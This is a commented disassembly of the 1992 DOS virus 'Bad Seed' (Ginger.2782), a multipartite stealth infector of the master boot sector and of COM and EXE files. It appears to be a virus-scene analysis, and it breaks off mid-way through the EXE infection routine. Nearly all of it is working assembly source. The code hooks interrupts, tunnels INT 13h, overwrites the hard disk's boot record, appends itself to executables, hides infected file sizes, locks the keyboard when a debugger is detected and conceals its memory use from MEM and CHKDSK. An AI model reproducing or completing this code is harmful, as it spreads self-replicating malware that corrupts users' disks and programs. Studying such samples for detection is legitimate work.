; Bad Seed (Ginger.2782) disasm.
; Multipartite full-stealth MBS/COM/EXE.
; Quite a good virus for it's time (1992), yet the coding style could be
; made more compact, and it's buggy aswell.
; Bugs marked with '***'.
; T-2000/IR, February 2000 - September 2000.


                .MODEL  TINY
                .CODE

Virus_Size      EQU     (End_Body-START)
Virus_Size_512  EQU     ((End_Body-START)+511)/512
Virus_Size_1024 EQU     3
COM             EQU     1
EXE             EQU     0
Boot            EQU     0
File            EQU     1

START:
                CALL    File_Entry

Boot_Loader:    ; *** This code assumes DS = 0, which
                ; does not necessarly have to be the case.

                ; Restore original word that was temporary
                ; replaced with the 55AAh bootmarker.

                MOV     WORD PTR DS:[7C00h+510], 0
Original_Word   =       WORD PTR $-2

                ; Steal 3k of DOS memory to hide the virus in.

                SUB     WORD PTR DS:[413h], Virus_Size_1024

                INT     12h                     ; Get new DOS memory size.

                MOV     CL, 6                   ; Calculate segment where to
                SHL     AX, CL                  ; hide.

                MOV     ES, AX                  ; ES = virus segment.

                ; Read rest of virusbody off disk.

                MOV     AX, 0200h+(Virus_Size_512-1)
                MOV     BX, 512+3
                MOV     CX, 3
                INT     13h

                MOV     AL, 0E8h                ; CALL xxxx opcode.
                XOR     DI, DI                  ; A call to the entrypoint
                CLD                             ; for file infections.
                STOSB

                MOV     AX, (File_Entry-Boot_Loader)
                STOSW

                MOV     CX, (512/2)             ; Copy virus bootsector
                MOV     SI, 7C00h               ; too to virus segment.
                REP     MOVSW

                ; Initialize some variables.

                MOV     ES:Ofs_Old_Int13h, OFFSET Old_Int13h
                MOV     ES:Ofs_Real_Int13h, OFFSET Real_Int13h
                MOV     ES:Origin, Boot
                MOV     ES:File_Handle, 0

                MOV     SI, OFFSET Hook_Ints

                PUSH    ES                      ; Relocated virus code.
		PUSH	SI

                MOV     AX, OFFSET Boot_Int21h
                MOV     SI, OFFSET Boot_Loader
                MOV     DI, OFFSET Old_Int08h
		NOP

                RETF                            ; Jump to relocated code.

EXE_Data:

EXE_SP          DW      0
EXE_SS          DW      0
EXE_IP          DW      0
EXE_CS          DW      0

                DB      'You can''t catch the Gingerbread Man!!'

File_Entry:
                XCHG    BP, AX                  ; Save AX (FCB-status) in BP.

                POP     SI                      ; POP delta offset.

                PUSH    ES                      ; Save ES & DS (PSP).
		PUSH	DS

		PUSH	CS
		POP	DS

                MOV     AX, 0EEE7h              ; See if virus is already
                INT     21h                     ; TSR.

                CMP     AX, 0D703h              ; It is?
                JE      JMP_Run_Host            ; Then bail to host.

                MOV     ES, ES:[2Ch]            ; Environment block.

                CLD
                XOR     DI, DI

Find_ComSpec:   PUSH    SI

                ; Scan for COMSPEC= to find the command interpreter.

                ADD     SI, (ComSpec_String-Boot_Loader)
                MOV     CX, 8
                REPE    CMPSB

                PUSHF

                CALL    Get_End_DI              ; Go to the next setting.

                POPF
                JE      Save_ComSpec            ; Yeah got it..

		POP	SI

                JNE     Find_ComSpec            ; Repeat the search.

JMP_Run_Host:   JMP     Run_Host

		DB	'Bad Seed - Made in OZ'

Save_ComSpec:   PUSH    DS                      ; Swap DS & ES.
		PUSH	ES
		POP	DS
		POP	ES

                XCHG    SI, DI                  ; SI = end of path to command
                                                ; interpreter.

                STD                             ; SI = last byte of path to
                LODSW                           ; command interpreter.

                MOV     CX, SI                  ; Remember end offset.
                DEC     CX                      ; Exclude the '\'.

                ADD     DI, 12                  ; DI = end of ComSpec_Value.
                                                ; *** Buffer is 1 byte too
                                                ; small, now filenames with
                                                ; 8 characters will fuck up.
Copy_ComSpec:   LODSB
                STOSB

                CMP     AL, '\'                 ; Copied entire filename?
                JNE     Copy_ComSpec            ; Otherwise just go on.

                SUB     CX, SI                  ; Get the size of the command
                                                ; interpreter filename.
		POP	SI

		PUSH	CS
		POP	DS

                ; Keep it for later use.

                MOV     [SI+(ComSpec_Length-Boot_Loader)], CL

                MOV     BYTE PTR [SI+(Origin-Boot_Loader)], File

                XOR     AX, AX                  ; ES = IVT.
                MOV     ES, AX

		PUSH	SI

                ; Copy the stealth code to an unused piece
                ; of memory (only used during bootup).

                ADD     SI, (File_Int21h-Boot_Loader)
                MOV     DI, 600h
                MOV     CX, (End_Body-File_Int21h)
                CLD
                REP     MOVSB

		POP	SI

                MOV     DS, CX                  ; DS = IVT.

                ; Patch appropriate offsets.

                MOV     DS:600h+(Ofs_Old_Int13h-File_Int21h), 600h+(Old_Int13h-File_Int21h)
                MOV     DS:600h+(Ofs_Real_Int13h-File_Int21h), 600h+(Real_Int13h-File_Int21h)

                MOV     AX, 600h                ; INT 21h ISR to hook up.

Hook_Ints:      CLI

                ; Starting from a bootsector or file?

                CMP     BYTE PTR CS:[SI+(Origin-Boot_Loader)], Boot
                JNE     Hook_Int21h

                MOV     AX, OFFSET New_Int08h   ; Hook INT 08h.
                XCHG    DS:[(08h*4)], AX
                STOSW

                MOV     AX, CS
                XCHG    DS:[(08h*4)+2], AX
                STOSW

                MOV     DS:[(21h*4)+2], 0FFFFh  ; Initialize DOS segment to
                                                ; a dummy value so the virus
                                                ; can determine when DOS has
                                                ; been loaded.
                STI

                ADD     DI, (Old_Int13h-(Old_Int08h+4))
                JMP     SHORT Init_Tunnel_13

Hook_Int21h:    XCHG    DS:[(21h*4)], AX        ; Hook INT 21h.
                STOSW

                XCHG    BX, AX                  ; Save original INT 21h.

                MOV     AX, ES
                XCHG    DS:[(21h*4)+2], AX
                STOSW

                XCHG    BX, AX                  ; Store original INT 21h
                STOSW                           ; another time.

                XCHG    BX, AX
                STOSW

                ; Hook INT 01h for recursive tunneling.

                LEA     AX, CS:[SI+(New_Int01h-Boot_Loader)]
                XCHG    DS:[(01h*4)], AX
                STOSW

                MOV     AX, CS
                XCHG    DS:[(01h*4)+2], AX
                STOSW

                STI

Init_Tunnel_13: CLC                             ; Save INT 13h, then tunnel
                                                ; INT 13h.
		PUSH	ES

Save_Int13h:    PUSH    DS

                LDS     BX, DS:[(13h*4)]        ; Get (tunneled) INT 13h.

                MOV     AX, BX                  ; Save (tunneled) INT 13h.
                STOSW

                MOV     AX, DS
                STOSW

                JC      Pick_i13h_ISR           ; Already tunneled INT 13h ?

                PUSH    DS                      ; ES:BX = INT 13h.
		POP	ES

                PUSHF                           ; Recursively tunnel INT 13h
                PUSH    CS                      ; if origin is file, else
                CALL    Tunnel_Int13h           ; just save INT 13h.

		POP	DS
		POP	ES

                STC                             ; Set flag to only save
                JC      Save_Int13h             ; INT 13h.

Pick_i13h_ISR:  POP     DS

		PUSH	SI

                CMP     BYTE PTR CS:[SI+(Origin-Boot_Loader)], Boot

                PUSHF

                ; Stealth ISR.

                MOV     SI, 600h+(Boot_Int13h-File_Int21h)

                JNE     Hook_Int13h

                ; Stealth/infection ISR.

                MOV     SI, OFFSET Boot_Int13h

Hook_Int13h:    CLI                             ; Hook the virus up.
                MOV     DS:[(13h*4)], SI
                MOV     DS:[(13h*4)+2], ES
                STI

                POPF

		POP	SI

		PUSH	CS
		POP	DS

                JE      Run_Old_Boot            ; Pass control to real BS.

                ; If running from a file then go infect the MBS.

		PUSH	ES

		PUSH	CS
		POP	ES

                MOV     AX, 0201h               ; Read the MBS of HDD 1.
                LEA     BX, CS:[SI+(Buffer-Boot_Loader)]
                MOV     CX, 1
                MOV     DX, 80h
                INT     03h

		POP	ES

                JNC     Scan_Part_Tbl           ; Go on if no error.

                JMP     SHORT Swap_Boot_ID      ; Error, bail.

Scan_Part_Tbl:  MOV     CX, 4                   ; Maximum of 4 partitions.
                MOV     DI, 1BEh                ; Start of partition info.

Find_Act_Part:  TEST    BYTE PTR [BX+DI], 80h   ; It's the active partition?
                JNZ     Chk_Partition

                ADD     DI, 16                  ; Next partition.

                LOOP    Find_Act_Part           ; Check all partitions.

Run_Host:       POP     DS                      ; Restore PSP.
                MOV     DX, DS                  ; Save PSP in DX.

		POP	ES

                ; This host is of EXE-type?

                CMP     CS:[SI+(Host_Header-Boot_Loader)], 'ZM'
                JE      Restore_EXE

                ; Restore .COM-file in memory and execute it.

                ADD     SI, (Host_Header-Boot_Loader)
                MOV     DI, 100h

                PUSH    CS                      ; Push entrypoint of host
                PUSH    DI                      ; *** CS mod ain't needed.

                MOVSB                           ; Restore first 3 bytes of
                MOVSW                           ; the host.

                XOR     AX, AX                  ; Clear registers.
                XOR     BX, BX
                XOR     CX, CX
                XOR     DX, DX
                XOR     SI, SI
                XOR     DI, DI

                XCHG    BP, AX                  ; Restore FCB status in AX.

                RETF                            ; Jump to the host.


Run_Old_Boot:
                XOR     CX, CX                  ; Zero ES.
                MOV     ES, CX

                MOV     AX, 0201h               ; Read the standard MS-DOS
                MOV     BX, 7C00h               ; bootsector.
                MOV     CX, 1
                MOV     DX, 0180h
                INT     13h

                PUSH    ES                      ; And go execute it.
		PUSH	BX
                RETF


Restore_EXE:    ADD     DX, (100h/16)           ; Get effective segment.

                ; Update old CS & SS with it.

                ADD     CS:[SI+(EXE_CS-Boot_Loader)], DX
                ADD     DX, CS:[SI+(EXE_SS-Boot_Loader)]

                ; Restore host's original stack.

                MOV     SS, DX
                MOV     SP, CS:[SI+(EXE_SP-Boot_Loader)]

                XCHG    BP, AX                  ; Restore AX (FCB status).

                ; Jump to the host's original entrypoint.

                JMP     DWORD PTR CS:[SI+(EXE_IP-Boot_Loader)]

Chk_Partition:  INC     DI                      ; Start of partition.

                MOV     ES:[600h+(Act_Partition-File_Int21h)], DI
                MOV     DS:[SI+(Act_Partition-Boot_Loader)], DI

                MOV     AX, 0200h               ; Head 0, sector 2 (where
                                                ; the virusbody is located).

                CMP     DS:[BX+DI], AX          ; MBS is already infected?
                JE      Run_Host                ; Then just bail out.

                MOV     DS:[BX+DI], AX          ; Point partition's boot-
                                                ; sector to virusbody.
		PUSH	CS
		POP	DS

                CLC                             ; No errors so far..

Swap_Boot_ID:   MOV     AX, 0AA55h              ; Bootsector ID.

                XCHG    DS:[SI+510], AX         ; Swap-in bootsector ID.

                PUSH    AX                      ; Save original word.
                JC      Chk_If_Unhook           ; Error occurred?

                ; Save original word in virusbody.

                MOV     [SI+(Original_Word-Boot_Loader)], AX

		PUSH	CS
		POP	ES

                MOV     AX, 0301h               ; Write patched MBS back
                MOV     CX, 1                   ; to disk.
                MOV     DX, 80h
                INT     03h
                JC      Chk_If_Unhook

                ; Write the virusbody to the zero-track.

                MOV     AX, 0300h + (Virus_Size_512)
                MOV     BX, SI
                MOV     CX, 2
                INT     03h

Chk_If_Unhook:  MOV     AX, 0                   ; Zero DS & ES (without
                MOV     ES, AX                  ; changing any flags).
                MOV     DS, AX

		PUSH	SI

                CLD
                CLI

                JNC     Restore_Int03h          ; Harddisk was succesfully
                                                ; infected? If not, unhook
                                                ; the INT 13h stealth.

                MOV     SI, 600h+(Old_Int13h-File_Int21h)
                MOV     DI, (13h*4)
                MOVSW
                MOVSW

Restore_Int03h: POP     SI
		PUSH	SI

		PUSH	CS
		POP	DS

                ; Restore INT 03h.

                ADD     SI, (Old_Int03h-Boot_Loader)
                MOV     DI, (03h*4)
                MOVSW
                MOVSW

                STI

		POP	SI

                POP     DS:[SI+510]             ; Restore original word.

                JMP     Run_Host


; Called with ES:BX as vector address of INT 13h.
Tunnel_Int13h:
                PUSHF

                ; Not necessary to tunnel from boot.

                CMP     BYTE PTR CS:[SI+(Origin-Boot_Loader)], Boot
                JE      Push_CS_IP

                POPF

                MOV     AX, 300h                ; Flags, TF & IF enabled.
		PUSH	AX

Push_CS_IP:     PUSH    ES                      ; Untunneled INT 13h.
		PUSH	BX

                MOV     AH, 01h                 ; Get status byte.
                MOV     DL, 80h                 ; 1st HDD.

New_Int01h:     CLI

                PUSH    BP                      ; Setup a stack pointer.
                MOV     BP, SP

                PUSH    BX                      ; Save scrap registers.
		PUSH	AX

                MOV     BX, CS                  ; *** Not used.

                MOV     AX, [BP+(2*2)]          ; Get segment of next
                                                ; instruction.

                CMP     AX, 70h                 ; In the DOS kernel?
                JA      Exit_Int01h             ; If not then get out.

		PUSH	DS
		PUSH	ES

                XOR     BX, BX                  ; DS = IVT.
                MOV     DS, BX

                MOV     DS:[(13h*4)+2], AX      ; Set tunneled address in
                                                ; IVT.

                MOV     BX, [BP+(1*2)]          ; And the IP..
                MOV     DS:[(13h*4)], BX

		PUSH	DI

                CALL    Get_Delta_1

Old_Int03h      DW      0, 0

Get_Delta_1:    POP     DI                      ; POP delta offset.

		PUSH	CS
		POP	ES

                CLD

                XCHG    BX, AX                  ; Revector the tunneled
                XCHG    DS:[(03h*4)], AX        ; INT 13h to INT 03h.
                STOSW

                XCHG    BX, AX
                XCHG    DS:[(03h*4)+2], AX
                STOSW

                PUSH    DS                      ; ES = IVT.
		POP	ES

		PUSH	SI

                ; Unhook INT 01h.

                MOV     SI, 600h+(Old_Int01h-File_Int21h)
                MOV     DI, (01h*4)
                MOVSW
                MOVSW

		POP	SI

		POP	DI
		POP	ES
		POP	DS

Exit_Int01h:    POP     AX                      ; Restore registers.
		POP	BX
		POP	BP

                STI                             ; *** Useless instruction.

                IRET


ComSpec_String  DB      'COMSPEC='
ComSpec_Value   DB      13 DUP (0)
ComSpec_Length  DW      0


New_Int08h:
                PUSH    DS
                PUSH    AX

                XOR     AX, AX                  ; DS = IVT.
                MOV     DS, AX

                CMP     DS:[(21h*4)+2], 1000h   ; DOS hasn't grabbed INT 21h
                JA      Exit_Int08h             ; yet? Then wait some more..

                PUSH    ES
                PUSH    SI
                PUSH    DI

                PUSH    CS
                POP     ES

                MOV     AX, CS
                MOV     DI, OFFSET Old_Int21h+2
                NOP

                STD                             ; Hook INT 21h.
                CLI
                XCHG    AX, DS:[(21h*4)+2]
                STOSW

                MOV     AX, OFFSET Boot_Int21h
                XCHG    AX, DS:[(21h*4)]
                STOSW

                PUSH    DS                      ; Swap DS & ES.
                PUSH    ES
                POP     DS
                POP     ES

                MOV     SI, DI                  ; Unhook INT 08h.
                MOV     DI, (08h*4)+2
                MOVSW
                MOVSW

                STI

                POP     DI
                POP     SI
                POP     ES

Exit_Int08h:    POP     AX
                POP     DS

                JMP     DWORD PTR CS:Old_Int08h


Boot_Int21h:
                PUSH    DS
                PUSH    AX

                XOR     AX, AX                  ; DS = IVT.
                MOV     DS, AX

                MOV     AX, DS:[(01h*4)]        ; Offset of INT 01h's ISR.

                CMP     AX, DS:[(03h*4)]        ; Same as INT 03h's ?
                JNE     Lock_Keyboard

                MOV     AX, DS:[(01h*4)+2]      ; Segment of INT 01h's ISR.

                CMP     AX, DS:[(03h*4)+2]      ; Same as INT 03h's ?
                JE      Exit_No_Debug           ; If INT 01h != INT 03h then
                                                ; a debugger is active.

Lock_Keyboard:  MOV     AL, 10000010b           ; Disable keyboard & printer.
                OUT     21h, AL

Exit_No_Debug:  POP     AX
		POP	DS

Test_11h_12h:   CMP     AH, 11h                 ; Findfirst (FCB) ?
                JE      Do_FCB_Stealth

                CMP     AH, 12h                 ; Findnext (FCB) ?
                JNE     Check_4_Create

        ; This is the routine Rock Steady/NuKE used in his
        ; FCB stealth tut, with one or two bytes changed.
        ; The rest of the code also shows a certain influence
        ; of the Rock Steady tuts.

Do_FCB_Stealth: CALL    Do_Old_Int21h           ; Do the filefind.

                TEST    AL, AL                  ; Error?
                JNZ     IRET_FCB_St

		PUSH	ES
		PUSH	AX
		PUSH	BX

                MOV     AH, 51h                 ; Obtain current PSP.
                CALL    Do_Old_Int21h

                MOV     ES, BX

                CMP     BX, ES:[16h]            ; Owner PSP == PSP ? (ie. is
                JNE     Exit_FCB_St             ; command interpreter?).

                MOV     BX, DX
                MOV     AL, [BX]                ; Get first byte of FCB.

		PUSH	AX

                MOV     AH, 2Fh                 ; Obtain current DTA.
                CALL    Do_Old_Int21h

		POP	AX

                INC     AL                      ; It's an extended FCB ?
                JNZ     Test_Seconds

                ADD     BX, 7                   ; Then skip extended stuff.

Test_Seconds:   MOV     AX, ES:[BX.FCB_Time]    ; Grab time word.

                AND     AX, 0000000000011111b   ; Mask out seconds value.

                XOR     AL, (60/2)              ; 60 seconds? (infected?).
                JNZ     Exit_FCB_St

                ; Set the seconds value in the DTA to 2.

                AND     BYTE PTR ES:[BX.FCB_Time], 11100000b
                OR      BYTE PTR ES:[BX.FCB_Time], (2/2)

                ; Subtract the virussize from the filesize.

                SUB     ES:[BX.FCB_Size], Virus_Size
                SBB     ES:[BX.FCB_Size+2], AX

Exit_FCB_St:    POP     BX
		POP	AX
		POP	ES

IRET_FCB_St:    IRET

Check_4_Create: CMP     AH, 3Ch                 ; Create/truncate file?
                JE      Set_RW_BX               ; Then save it's handle
                                                ; so it can be infected
                                                ; on close.

                CMP     AH, 3Dh                 ; Open file?
                JE      Set_RW_AL               ; Go infect it.

                CMP     AH, 3Eh                 ; Close file?
                JNE     Check_4_Read

                JMP     Infect_3E               ; Infect it if it was
                                                ; a newly created file.

Check_4_Read:   CMP     AH, 3Fh                 ; Read file?
                JE      J_Go_Chk_Secs           ; Stealth the read.

                CMP     AH, 40h                 ; Write file?
                JE      J_Go_Chk_Secs           ; Disinfect the file.

                CMP     AH, 42h                 ; Seek file?
                JNE     Check_4_Exec

                CMP     AL, 02h                 ; Seek EOF relative?
                JB      J1_J_Old_i21h

J_Go_Chk_Secs:  JMP     Go_Check_Secs           ; Stealth stuff.

Check_4_Exec:   CMP     AH, 4Bh                 ; Execute/load file?
                JNE     Check_4_Exit

                CMP     AL, 02h                 ; It's either 4B00h or 4B01h?
                JB      CALL_Do_Infect          ; Else don't infect.

                JMP     SHORT J1_J_Old_i21h

Set_RW_AL:      CMP     CS:Windows_Active, 1    ; Is Windoze running? Then
                JE      J1_J_Old_i21h           ; don't do anything.

                CMP     AX, 3D01h               ; Open file, write-only?
                JNE     CALL_Do_Infect

                INC     AL                      ; Then change access mode to
                                                ; read/write so the virus
                                                ; can read from it when it
                                                ; wants to disinfect it.

CALL_Do_Infect: CALL    Do_Infect               ; Infect it.

J1_J_Old_i21h:  JMP     JMP_Old_Int21h

Check_4_Exit:   CMP     AH, 4Ch                 ; Program terminate?
                JNE     Check_4_Date_T

                JMP     Check_Win_Exit          ; Go check if it's Windoze.

Check_4_Date_T: CMP     AH, 57h                 ; Get/set file date & time?
                JNE     Chk_4_Create_N

                JMP     Stealth_Seconds         ; Don't let em fuck with the
                                                ; seconds.

Chk_4_Create_N: CMP     AH, 5Bh                 ; Create new file?
                JE      Set_RW_BX               ; Save it's handle for later.

                CMP     AX, 6C00h               ; Extended open/create?
                JNE     Chk_4_Res_Chk

Set_RW_BX:      CMP     CS:Windows_Active, 1    ; Is Windoze up and running?
                JE      J1_J_Old_i21h           ; Then abort any infection.

		PUSH	BX
		PUSH	DX

                CMP     AX, 6C00h               ; Don't infect on create.
                JNE     Save_Handle

                OR      BL, 00000010b           ; Change access mode to
                AND     BL, 11111110b           ; read/write.

                MOV     DX, SI                  ; DX = offset filepath.
                CALL    Do_Infect

Save_Handle:    PUSH    BX
		PUSH	ES
		PUSH	AX
		PUSH	CX
		PUSH	SI
		PUSH	DI

		PUSH	DS
		POP	ES

                CALL    Get_End_DX              ; Go to end of path.

                STD
                MOV     SI, DI

                LODSB                           ; SI = last word extension.
                LODSW

                CALL    Check_Extension         ; .COM/EXE extension?

                MOV     CS:Valid_Handle, CL     ; Mark handle as invalid (0).

                JNE     Do_Open_Create

                INC     CX                      ; Mark handle as valid (1).
                MOV     CS:Valid_Handle, CL

Do_Open_Create: POP     DI
		POP	SI
		POP	CX
		POP	AX
		POP	ES
		POP	BX
		POP	DX

		PUSH	AX

                CALL    Do_Old_Int21h           ; Do the open/create call.
                JC      Clear_Inf_Hand

                INC     SP                      ; Remove the top word on
                INC     SP                      ; the stack.

                XCHG    BX, AX                  ; Save the new filehandle.

		PUSH	CX
		PUSH	DX

                MOV     AX, 5700h               ; Get file's date & time.
                CALL    Do_Old_Int21h

                CALL    Check_60_Secs           ; It's infected?

		POP	DX
		POP	CX

                XCHG    BX, AX

                JNE     Save_Inf_Hand

                MOV     CS:Valid_Handle, AL     ; Mark handle as valid (> 0).

Save_Inf_Hand:  MOV     CS:File_Handle, AL      ; Save this filehandle.
		POP	BX
                JMP     IRET_Flags

Clear_Inf_Hand: MOV     CS:Valid_Handle, 0      ; Reset handle-valid boolean.
		POP	AX
		POP	BX
                JMP     JMP_Old_Int21h

Chk_4_Res_Chk:  CMP     AX, 0EEE7h              ; It's the virus' TSR check?
                JE      Return_ID_1

                JMP     JMP_Old_Int21h

Return_ID_1:    MOV     AH, 0D7h                ; Return ID in AX and return.

New_Int24h:     MOV     AL, 03h                 ; Fail silently.
                IRET


Get_End_DX:
                MOV     DI, DX

Get_End_DI:     XOR     AL, AL                  ; Scan to the end of the
                MOV     CL, 128                 ; filepath.
                CLD
                REPNZ   SCASB

		RETN


Do_Infect:
		PUSH	ES
		PUSH	BX
		PUSH	CX
		PUSH	SI
		PUSH	DI
		PUSH	DS
		PUSH	DX

		PUSH	DS
		POP	ES

		PUSH	AX

                CALL    Get_End_DX

                DEC     DI                      ; DI = last byte of filename.
		DEC	DI

		PUSH	CS
		POP	DS

                MOV     CX, ComSpec_Length
                MOV     SI, OFFSET ComSpec_String+8+12
                STD

		PUSH	DI

Comp_ComSpec:   LODSB                           ; Save ComSpec byte in AH.
                MOV     AH, AL

                XCHG    SI, DI

                LODS    BYTE PTR ES:[SI]        ; Fetch byte from filename.

                XCHG    SI, DI

                AND     AX, 5F5Fh               ; Convert word to uppercase.

                CMP     AH, AL                  ; Bytes match?
                JNE     Go_Check_Ext            ; If not it's not ComSpec.

                LOOP    Comp_ComSpec

                POP     DI                      ; If it get's to here, the
                                                ; file is the COMSPEC, and
                JMP     Exit_Infect             ; infection is denied.

; Returns ZF if file has COM/EXE extension.
Check_Extension:
                MOV     CX, 2

Get_Extension:  LODS    WORD PTR ES:[SI]

                AND     AX, 5F5Fh               ; Uppercase.

                XCHG    BX, AX

                LOOP    Get_Extension

                CMP     AX, 'MO'
                JNE     Check_For_EXE

                CMP     BX, 'C.' AND 5F5Fh

		RETN

Check_For_EXE:  CMP     AX, 'EX'
                JNE     Exit_Check_Ext

                CMP     BX, 'E.' AND 5F5Fh

Exit_Check_Ext: RETN

Go_Check_Ext:   POP     SI                      ; SI = last byte of filename.
                DEC     SI                      ; SI = last word of filename.

                POP     AX                      ; AX on entry.
		PUSH	AX

                CMP     AX, 4B00h               ; Program execute?
                PUSHF

                CALL    Check_Extension         ; File has COM/EXE extension?
                JE      Go_Chk_Win_Act

                POPF
                JE      Find_File_Name

                JMP     Exit_Infect

                DB      'CHKDSK', 0
Windows_Active  =       BYTE PTR $-1

                DB      'MEM'
Mem_String      =       $-1

Go_Chk_Win_Act: POPF
                JNE     Check_Windows

Find_File_Name: INC     SI                      ; DI = byte before dot.
                MOV     DI, SI

                INC     SI                      ; SI = extension dot.

                MOV     CX, SI                  ; Calculate path length.
                SUB     CX, DX

                XCHG    SI, DI

Chk_Start_Name: LODS    BYTE PTR ES:[SI]        ; Fetch a byte from path.

                CMP     AL, '\'                 ; Path seperator? Then start
                JE      Get_Start_Name          ; of filename is found.

                LOOP    Chk_Start_Name

                JNE     Chk_File_Name

Get_Start_Name: INC     SI                      ; SI = start of filename.
		INC	SI

                MOV     DX, SI

Chk_File_Name:  MOV     CX, DI                  ; Calculate length of
                SUB     CX, DX                  ; filename without extension.

                DEC     DI                      ; DI = last byte of filename.
                MOV     SI, OFFSET Mem_String

                CMP     CX, 3                   ; Can it be 'MEM' ?
                JE      Compare_Byte

                LODSW                           ; SI = 'CHKDSK' string.
                LODSW

                CMP     CX, 6                   ; Can it be 'CHKDSK' ?
                JNE     Check_Windows

Compare_Byte:   LODSB                           ; Fetch byte of filename and
                MOV     AH, AL                  ; save it in AH.

                XCHG    SI, DI

                LODS    BYTE PTR ES:[SI]        ; Fetch byte of match string.

                AND     AX, 5F5Fh               ; Convert to uppercase.

                CMP     AH, AL                  ; Bytes are the same?
                JNE     Check_4_Win             ; If not, skip this shit.

                XCHG    SI, DI

                LOOP    Compare_Byte

        ; Now that either MEM or CHKDSK are about to be executed, the
        ; virus will temporarily hook INT 12h to stealth the total
        ; amount of DOS memory available, which these programs will
        ; display.

                MOV     AX, OFFSET New_Int12h
                MOV     DI, OFFSET Old_Int12h
		NOP

                MOV     DS, CX                  ; DS = IVT.

		PUSH	CS
		POP	ES

                CLD
                CLI

                XCHG    DS:[(12h*4)], AX        ; Save & hook INT 12h.
                STOSW

                MOV     AX, CS
                XCHG    DS:[(12h*4)+2], AX
                STOSW

                STI
                JMP     SHORT Check_Windows

Check_4_Win:    CMP     CX, 3                   ; Can it be 'WIN.COM' ?
                JNE     Check_Windows

                CMP     AL, 'N'                 ; (WI)N ?
                JNE     Check_Windows

                DEC     SI                      ; SI = 1st word of filename.
                LODS    WORD PTR ES:[SI]

                AND     AX, 5F5Fh               ; Uppercase.

                CMP     AX, 'IW'                ; So it's WIN.COM ?
                JNE     Check_Windows

                MOV     Windows_Active, 1       ; Set Windoze-active flag.

Check_Windows:  CMP     CS:Windows_Active, 1    ; Don't infect under Windoze.
                JE      Exit_Infect

                CLI

                XOR     CX, CX                  ; DS = IVT.
                MOV     DS, CX

                LES     BX, DS:[(24h*4)]        ; Save original INT 24h.
		PUSH	ES
		PUSH	BX

                ; Install own dummy critical-error handler.

                MOV     DS:[(24h*4)], OFFSET New_Int24h
                MOV     DS:[(24h*4)+2], CS

                STI

		PUSH	DS

                PUSH    BP                      ; Setup stackframe.
                MOV     BP, SP

                LDS     DX, [BP+(5*2)]          ; DS:DX = path of file.

		POP	BP

		PUSH	DS
		PUSH	DX

                MOV     AX, 4300h               ; Get file's attributes.
                CALL    Do_Old_Int21h
		PUSH	CX
                JC      Restore_Attr

                TEST    CL, 00000001b           ; Readonly bit set?
                JZ      Open_File

                DEC     CX                      ; Remove readonly bit.

                MOV     AX, 4301h               ; Set new attributes.
                CALL    Do_Old_Int21h

Open_File:      MOV     AX, 3D02h               ; Open target file for r/w.
                CALL    Do_Old_Int21h
                JC      Restore_Attr

                XCHG    BX, AX                  ; Save filehandle in BX.

                MOV     AX, 5700h               ; Get file date & time.
                CALL    Do_Old_Int21h
                JC      Close_File

                CALL    Check_60_Secs           ; Already infected?
                JE      Close_File

                PUSH    CX                      ; Save original filedate &
                PUSH    DX                      ; time with 60 seconds set.

                CALL    Infect_Handle           ; Infect the handle.

		POP	DX
		POP	CX

                JC      Close_File              ; Error occurred?

                MOV     AX, 5701h               ; Restore file date & time
                CALL    Do_Old_Int21h           ; with 60 seconds.

Close_File:     MOV     AH, 3Eh                 ; Close the file.
                CALL    Do_Old_Int21h

Restore_Attr:   POP     CX                      ; File path & attributes.
		POP	DX
		POP	DS

                JC      Restore_Int24h          ; Error occurred?

                TEST    CL, 00000001b           ; Need to restore the
                JZ      Restore_Int24h          ; readonly flag?

                MOV     AX, 4301h               ; Fix file-attributes.
                CALL    Do_Old_Int21h

Restore_Int24h: POP     DS
		POP	BX
		POP	AX

                MOV     DS:[(24h*4)], BX        ; Restore INT 24h.
                MOV     DS:[(24h*4)+2], AX

Exit_Infect:    POP     AX
		POP	DX
		POP	DS
		POP	DI
		POP	SI
		POP	CX
		POP	BX
		POP	ES

		RETN


Infect_Handle:
		PUSH	CS
		POP	DS

                MOV     DX, OFFSET Buffer       ; Read file's header.
		NOP
                MOV     CX, 24
                MOV     AH, 3Fh
                CALL    Do_Old_Int21h

                SUB     CX, AX                  ; All bytes were read?
                JNZ     Error_Exit_Inf

                PUSH    DS                      ; ES = CS.
		POP	ES

                XCHG    CX, AX                  ; CX = 24.

                MOV     SI, DX                  ; Save a copy of the original
                MOV     DI, OFFSET Host_Header  ; header.
                CLD
                REP     MOVSB

                MOV     DI, DX                  ; DX = header.
                MOV     SI, OFFSET EXE_Data

                ; Save host's original SS:SP.

                LES     AX, DWORD PTR [DI.Program_SS]

                MOV     [SI+(EXE_SP-EXE_Data)], ES
                MOV     [SI+(EXE_SS-EXE_Data)], AX

                ; Save host's original CS:IP.

                LES     AX, DWORD PTR [DI.Program_IP]

                MOV     [SI+(EXE_IP-EXE_Data)], AX
                MOV     [SI+(EXE_CS-EXE_Data)], ES

                MOV     Host_Type, CL           ; Initialize file as .EXE.

                MOV     AX, 'MZ'                ; EXE marker.

                CMP     AX, [DI.EXE_ID]         ; .EXE-ID is 'ZM' ?
                XCHG    AH, AL                  ; Change .EXE-ID to 'MZ'.
                JNE     Check_For_MZ

                MOV     [DI.EXE_ID], AX         ; Set .EXE-ID to 'MZ'.

Check_For_MZ:   CMP     AX, [DI.EXE_ID]         ; 'MZ' .EXE-file?
                JE      Save_File_Size

                INC     Host_Type               ; Mark as .COM-file.

Save_File_Size: MOV     AX, 4202h               ; Seek to EOF.
                MOV     DX, CX
                CALL    Do_Old_Int21h
                JC      Exit_Inf_Hand

                ; Remember size of host for later use.

                MOV     [DI+(Host_Size-Buffer)], AX
                MOV     [DI+(Host_Size-Buffer)+2], DX

                CMP     Host_Type, EXE          ; File is .EXE-type? Then
                JE      Check_Header            ; size check ain't needed.

                CMP     AX,-(Virus_Size+264h)   ; .COM-file ain't too big?
                JB      Append_Body

Error_Exit_Inf: STC                             ; Else mark error.

Exit_Inf_Hand:  RETN

Check_Header:   PUSH    DI

                MOV     CX, 9

                MOV     SI, [DI.File_512_Pages] ; Filesize in 512-byte pages.
                DEC     SI                      ; Undo 512-byte round.

                XOR     DI, DI                  ; DI:SI = imagesize.

Mul_512:        SHL     SI, 1                   ; Calculate imagesize in
                RCL     DI, 1                   ; DI:SI.
                LOOP    Mul_512

                CMP     DX, DI                  ; High word doesn't match?
		POP	DI
                JNE     Error_Exit_Inf          ; Then it's an overlay.

                ADD     SI, [DI.Image_Mod_512]  ; Image size remainder.

                ; Low word of filesize doesn't match?

